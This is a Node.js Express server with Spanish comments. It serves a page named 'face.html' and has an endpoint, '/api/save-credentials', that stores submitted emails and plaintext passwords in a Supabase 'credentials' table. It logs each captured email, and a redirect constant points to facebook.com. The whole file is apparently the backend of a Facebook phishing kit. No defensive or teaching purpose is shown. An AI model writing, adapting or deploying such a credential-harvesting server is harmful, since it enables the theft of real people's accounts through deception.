import 'dotenv/config.js';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const REDIRECT_URL = 'https://www.facebook.com'; // Cambia aquí
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Ruta para guardar credenciales
app.post('/api/save-credentials', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ message: 'Email y contraseña requeridos' });
        }

        const supabaseUrl = process.env.SUPABASE_URL;
        const supabaseKey = process.env.SUPABASE_KEY;

        if (!supabaseUrl || !supabaseKey) {
            console.error('Variables de entorno faltantes');
            return res.status(500).json({ message: 'Error de configuración del servidor' });
        }

        const supabase = createClient(supabaseUrl, supabaseKey);

        const { data, error } = await supabase
            .from('credentials')
            .insert([{ email, password }]);

        if (error) {
            console.error('Error de Supabase:', error);
            return res.status(500).json({ message: `Error de base de datos: ${error.message}` });
        }

        console.log('Credenciales guardadas:', email);
        res.status(200).json({ message: 'Credenciales guardadas', data });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ message: `Error del servidor: ${error.message}` });
    }
});

// Ruta para servir face.html en la raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'face.html'));
});

app.listen(PORT, () => {
    console.log(`✓ Servidor corriendo en http://localhost:${PORT}`);
    console.log(`✓ Abre http://localhost:${PORT} en tu navegador`);
});
